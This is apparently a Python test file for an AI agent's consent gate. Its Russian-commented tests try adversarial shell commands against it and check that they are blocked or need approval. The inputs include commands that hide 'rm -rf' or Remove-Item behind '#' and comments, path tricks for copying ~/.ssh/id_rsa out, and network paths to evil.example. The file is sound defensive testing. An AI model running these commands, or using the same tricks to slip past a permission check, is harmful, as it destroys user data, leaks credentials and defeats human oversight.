"""Ворота согласия: находки финального ревью 0.4 (C1, I1, I2) и
состязательный проход по `read_plan` / `shell_risk` / `_path_ok`.

Каждый случай — настоящие ворота `ConsentGate(own_dirs=[запись])`: команда
чтения (`read_plan`) в ходах READ и USER проходит БЕЗ классификатора CLI
(хук отвечает `allow`), поэтому любая команда, выдающая себя за чтение, —
дыра; `shell_risk` — карточка Meet поверх автомода."""

import os

import pytest

from meet.llm import consent
from meet.llm.consent import ALLOW, ASK, DENY, NONE, READ, USER, ConsentGate

_UNC_START = ("\\\\", "//", "/\\", "\\/")


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    """Ворота не открывают сетевые пути никогда: `realpath` на `\\\\host\\…`
    на Windows идёт по SMB (и отдаёт хеш NTLM чужому хосту)."""
    calls = []
    real = os.path.realpath

    def guarded(path, *a, **kw):
        if str(path).startswith(_UNC_START):
            calls.append(str(path))
            raise AssertionError(f"realpath на сетевом пути: {path}")
        return real(path, *a, **kw)

    monkeypatch.setattr(consent.os.path, "realpath", guarded)
    return calls


@pytest.fixture
def env(tmp_path):
    rec = tmp_path / "rec"
    home = tmp_path / "home"
    for d in (rec, home / ".ssh", tmp_path / "cwd", tmp_path / "outside"):
        d.mkdir(parents=True)
    (rec / "a.txt").write_text("a", encoding="utf-8")
    sensitive = consent.sensitive_paths(data_dir=tmp_path / "data", library_root=tmp_path / "lib", home=home)
    gate = ConsentGate(own_dirs=[rec], sensitive=sensitive, cwd=tmp_path / "cwd")
    p = lambda x: str(x).replace("\\", "/")  # noqa: E731
    return {"gate": gate, "rec": p(rec), "home": p(home), "out": p(tmp_path / "outside"), "root": tmp_path}


def _cmd(env, command):
    return command.format(rec=env["rec"], home=env["home"], out=env["out"])


def _decide(env, level, tool, command):
    gate = env["gate"]
    gate.begin(level)
    return gate.decide(tool, {"command": _cmd(env, command)})


# --- C1: «#» не режет команду ----------------------------------------------------------------

_HASH = [
    ("Bash", "cat {rec}/a.txt#; rm -rf {rec}/b"),                 # посреди слова — не комментарий
    ("Bash", "cat {rec}/a.txt#x; rm -rf {rec}/b"),
    ("Bash", "cat {rec}/a.txt #; rm -rf {rec}/b"),                # в начале слова — комментарий bash
    ("Bash", "# заметка\nrm -rf {rec}/b"),                        # строка-комментарий, потом команда
    ("Bash", "# >\nrm -rf {rec}/b"),
    ("PowerShell", "Get-Content {rec}/a.txt#; Remove-Item {rec}/b"),
    ("PowerShell", "Get-Content {rec}/a.txt #; Remove-Item {rec}/b"),
    ("PowerShell", "Get-Content {rec}/a.txt <# x #>; Remove-Item {rec}/b"),
    ("PowerShell", "<# x #>Remove-Item {rec}/b"),
    ("PowerShell", "# заметка\nRemove-Item {rec}/b"),
]


@pytest.mark.parametrize("tool,command", _HASH)
def test_hash_never_hides_a_second_command(env, tool, command):
    cmd = _cmd(env, command)
    assert consent.read_plan(tool, cmd) is None, cmd
    assert consent.shell_risk(tool, cmd) == consent.DELETE, cmd
    for level in (READ, USER):
        d = _decide(env, level, tool, command)
        assert d.outcome != ALLOW and d.kind != "shell-read", (level, cmd, d)
    assert _decide(env, USER, tool, command).outcome == ASK


@pytest.mark.parametrize("tool,command", [
    ("Bash", "ls x#; rm -rf {rec}/b"), ("Bash", "echo a#b; rm -rf {out}"),
    ("PowerShell", "ls x#; Remove-Item {out}"),
])
def test_hash_never_hides_a_delete_from_the_risk_check(env, tool, command):
    assert consent.shell_risk(tool, _cmd(env, command)) == consent.DELETE
    d = _decide(env, USER, tool, command)
    assert d.outcome == ASK and d.why == consent.DELETE, d


@pytest.mark.parametrize("tool,command", [
    ("Bash", "cat {rec}/a.txt # прочитать"), ("Bash", "grep -n '#' {rec}/a.txt"),
    ("PowerShell", "Get-Content {rec}/a.txt # прочитать"), ("PowerShell", "Get-Content {rec}/a#b.txt"),
])
def test_any_hash_makes_a_command_not_a_plain_read(env, tool, command):
    """Чтение с «#» — не «простая команда чтения» (решает автомод или карточка),
    но и не удаление."""
    cmd = _cmd(env, command)
    assert consent.read_plan(tool, cmd) is None
    assert consent.shell_risk(tool, cmd) != consent.DELETE
    assert _decide(env, READ, tool, command).outcome == DENY


@pytest.mark.parametrize("tool,command", [
    ("Bash", "echo 'без пары"), ("PowerShell", "Write-Output <# без конца"),
])
def test_a_command_that_cannot_be_parsed_is_a_card_without_a_grant(env, tool, command):
    assert consent.shell_risk(tool, command) == consent.UNPARSED
    d = _decide(env, USER, tool, command)
    assert d.outcome == ASK and d.why == consent.UNPARSED and d.card["grant"] is None, d
    assert d.label == "спрашиваю вас: непонятная команда"
    assert env["gate"].grant_for(tool, {"command": command}) is None


# --- I1: списки путей PowerShell и нормализация путей --------------------------------------------

@pytest.mark.parametrize("command", [
    "Get-Content {rec}/a.txt,{home}/./.ssh/id_rsa",
    "Get-Content {rec}/a.txt, {home}/.ssh/id_rsa",
    "Get-Content -Path {rec}/a.txt,{home}/.ssh/id_rsa",
    "gc {rec}/a.txt,{home}/x/../.ssh/id_rsa",
    "Get-ChildItem {rec},{home}/.ssh",
    "Select-String -Pattern x -Path {rec}/a.txt,{home}/.ssh/id_rsa",
])
def test_powershell_path_lists_never_read_a_sensitive_file(env, command):
    cmd = _cmd(env, command)
    assert consent.read_plan("PowerShell", cmd) is None, cmd
    for level in (READ, USER):
        d = _decide(env, level, "PowerShell", command)
        assert d.outcome == DENY, (level, cmd, d)
    assert _decide(env, USER, "PowerShell", command).why == "sensitive"


@pytest.mark.parametrize("command", [
    "Get-Content {rec}/a.txt,{rec}/b.txt", "Get-Content @args", "Get-Content {rec}/a.txt {rec}/b.txt",
    "Get-Content -Path {rec}/a.txt -Path {rec}/b.txt", "Get-Content {rec}/a.txt -Path {rec}/b.txt",
    "Get-Content -LiteralPath {rec}/a.txt -Path {rec}/b.txt", "Get-ChildItem {rec} {rec}",
])
def test_powershell_read_takes_one_literal_path_per_parameter(env, command):
    assert consent.read_plan("PowerShell", _cmd(env, command)) is None


def test_one_powershell_path_is_still_a_read(env):
    for command in ("Get-Content {rec}/a.txt", "Get-Content -Path {rec}/a.txt -TotalCount 5",
                    "Get-ChildItem -Path {rec} -Filter x.md", "Select-String -Pattern x -Path {rec}/a.txt"):
        d = _decide(env, READ, "PowerShell", command)
        assert d.outcome == ALLOW and d.kind == "shell-read", (command, d)


@pytest.mark.parametrize("tool,command", [
    ("Bash", "cat {home}/./.ssh/id_rsa"), ("PowerShell", "Get-Content {home}/./.ssh/id_rsa"),
    ("PowerShell", r"Get-Content {home}\.\.ssh\id_rsa"), ("Bash", "cat {home}/x/../.ssh/id_rsa"),
    # не команда чтения — та же проверка по тексту, после нормализации пути
    ("Bash", "cp {home}/./.ssh/id_rsa {out}/k"), ("Bash", "cp {home}//.ssh//id_rsa {out}/k"),
    ("Bash", "cp {home}/x/../.ssh/id_rsa {out}/k"), ("PowerShell", "Copy-Item {home}/./.ssh/id_rsa {out}/k"),
    ("PowerShell", r"Copy-Item {home}\.ssh\id_rsa {out}/k"), ("Bash", "cp {home}/.ss''h/id_rsa {out}/k"),
    ("Bash", "cp \"{home}\"/.ssh/id_rsa {out}/k"), ("Bash", "cp {home}/.ssh./id_rsa {out}/k"),
    ("PowerShell", "Copy-Item {rec}/a.txt,{home}/./.ssh/id_rsa {out}"),
])
def test_sensitive_paths_are_found_after_normalising(env, tool, command):
    for level in (READ, USER):
        d = _decide(env, level, tool, command)
        assert d.outcome == DENY and d.why == "sensitive", (level, command, d)


# --- I2: сетевые пути (UNC) и пути устройств ------------------------------------------------------

_UNC = ["//evil.example/share/x", r"\\evil.example\share\x", r"\\?\UNC\evil.example\share\x",
        "//?/UNC/evil.example/share/x", r"\\.\UNC\evil.example\share\x", "/\\evil.example\\share\\x"]
_DEVICES = [r"\\.\pipe\meet", r"\\.\PhysicalDrive0", r"\\?\GLOBALROOT\Device\X", r"\\?\Volume{1}\x"]


@pytest.mark.parametrize("path", _UNC + _DEVICES)
def test_resolve_never_touches_a_network_or_device_path(path, no_network):
    assert consent.resolve(path) is None
    assert no_network == []


def test_resolve_keeps_a_local_path_with_a_device_prefix(env):
    rec = env["rec"].replace("/", "\\")
    assert consent.resolve("\\\\?\\" + rec + "\\a.txt") == consent.resolve(env["rec"] + "/a.txt")


@pytest.mark.parametrize("level", [NONE, READ, USER])
@pytest.mark.parametrize("tool,key", [("Read", "file_path"), ("Grep", "path"), ("Glob", "path"),
                                      ("LS", "path"), ("Write", "file_path")])
@pytest.mark.parametrize("path", _UNC + _DEVICES)
def test_file_tools_on_network_paths_are_denied_at_every_level(env, level, tool, key, path):
    gate = env["gate"]
    gate.begin(level)
    data = {key: path, **({"pattern": "*"} if tool in ("Grep", "Glob") else {})}
    d = gate.decide(tool, data)
    assert d.outcome == DENY and d.why == "sensitive", (tool, path, d)


@pytest.mark.parametrize("pattern", ["//evil.example/share/*", r"\\evil.example\share\**\*.md"])
def test_glob_patterns_on_network_paths_are_denied(env, pattern):
    gate = env["gate"]
    gate.begin(USER)
    assert gate.decide("Glob", {"pattern": pattern}).outcome == DENY


@pytest.mark.parametrize("tool,command", [
    ("Bash", "cat //evil.example/share/x"), ("Bash", "cat '\\\\evil.example\\share\\x'"),
    ("Bash", "head -n 5 //evil.example/share/x"), ("Bash", "ls //evil.example/share"),
    ("PowerShell", "Get-Content //evil.example/share/x"), ("PowerShell", r"Get-Content \\evil.example\share\x"),
    ("PowerShell", r"Get-ChildItem \\?\UNC\evil.example\share"), ("PowerShell", r"type \\.\pipe\meet"),
])
def test_shell_reads_of_network_paths_are_not_reads_and_ask_as_sending(env, tool, command):
    assert consent.read_plan(tool, command) is None, command
    assert _decide(env, READ, tool, command).outcome == DENY
    d = _decide(env, USER, tool, command)
    assert d.outcome == ASK and d.why in (consent.SEND, consent.UNPARSED), (command, d)


def test_shell_text_with_slashes_is_not_a_network_path(env):
    for command in ("grep -n '//TODO' {rec}/a.txt", "echo https://example.com/a"):
        assert consent.shell_risk("Bash", _cmd(env, command)) == "", command


def test_mcp_arguments_with_network_paths_need_a_card(env):
    gate = env["gate"]
    gate.begin(USER)
    for value in (r"\\evil.example\share\x", "//evil.example/share/x"):
        d = gate.decide("mcp__fs__read_file", {"path": value})
        assert d.outcome == ASK, (value, d)
    gate.begin(READ)
    assert gate.decide("mcp__fs__read_file", {"path": r"\\evil.example\share\x"}).outcome == DENY


def test_working_folders_on_a_network_share_still_work_without_touching_the_network(env):
    """База знаний на сетевом диске (`\\\\nas\\kb`), настроенная человеком:
    сравнение — по тексту пути, без обращения к сети; закрытая папка внутри — закрыта."""
    sensitive = consent.sensitive_paths(data_dir=env["root"] / "data", library_root=env["root"] / "lib",
                                        home=env["home"])
    gate = ConsentGate(own_dirs=[env["rec"]], work_dirs=[r"\\nas\kb"], deny_paths=[r"\\nas\kb\Личное"],
                       sensitive=sensitive, cwd=env["root"] / "cwd")
    gate.begin(NONE)
    assert gate.decide("Read", {"file_path": r"\\nas\kb\План.md"}).outcome == ALLOW
    assert gate.decide("Read", {"file_path": "//NAS/kb/sub/../План.md"}).outcome == ALLOW
    assert gate.decide("Read", {"file_path": r"\\nas\kb\Личное\a.md"}).why == "excluded"
    assert gate.decide("Read", {"file_path": r"\\nas\other\a.md"}).why == "sensitive"
    assert gate.decide("Read", {"file_path": r"\\evil\kb\a.md"}).why == "sensitive"
    gate.begin(USER)
    assert gate.decide("Write", {"file_path": r"\\nas\kb\new.md", "content": "x"}).outcome == consent.AUTO
